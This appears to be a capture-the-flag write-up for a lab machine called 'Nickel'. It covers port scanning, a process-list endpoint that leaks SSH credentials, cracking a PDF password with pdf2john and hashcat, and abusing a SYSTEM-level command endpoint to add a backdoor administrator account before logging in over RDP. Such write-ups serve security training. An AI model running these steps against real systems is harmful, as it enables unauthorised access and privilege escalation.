# Nickel

### Enumeration

```
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
```

```
$ curl -X POST -d "1" http://192.168.94.99:33333/list-running-procs

commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "[REDACTED-BASE64ENCODED]" --server nickel-dev --protocol ssh
```

### Initial Access

Connect with credentials to SSH.

### PrivEsc

There is a password protected PDF: Infrastructure.pdf

```
$ /usr/share/john/pdf2john.pl Infrastructure.pdf > hash.txt
$ hash.txt
Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*[REDACTED]
```

10500 - PDF 1.4 - 1.6 (Acrobat 5 - 8)

```
$ hashcat -m 10500 -w 4 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Open the PDF with the password.

> Infrastructure Notes
>
> Temporary Command endpoint: http://\[REDACTED]/?

```
PS C:\> $wc = New-Object Net.WebClient
PS C:\> $wc.DownloadString("http://[REDACTED]/?whoami")
<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24

        <pre>nt authority\system
</pre>
</body></html>

PS C:\USers\Administrator> $wc.DownloadString("http://[REDACTED]/?net user cel1s0 pass123 /add")
PS C:\USers\Administrator> $wc.DownloadString("http://[REDACTED]/?net localgroup administrators cel1s0 /add")
```

```
$ xfreerdp /u:cel1s0 /p:pass123 /v:192.168.94.99:3389
```
